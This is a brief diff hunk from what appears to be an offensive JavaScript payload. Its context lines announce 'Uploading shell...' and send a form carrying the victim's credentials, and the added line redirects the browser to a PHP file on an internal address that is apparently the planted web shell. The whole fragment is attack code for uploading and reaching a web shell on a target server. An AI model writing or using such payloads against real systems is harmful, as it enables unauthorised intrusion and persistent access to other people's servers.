@@ -17,4 +17,5 @@ alert("Uploading shell...");
     credentials: "include",
     body: form
   });
+  window.location.href = "https://10.23.108.10/app/ft/ft2.php";
 })();
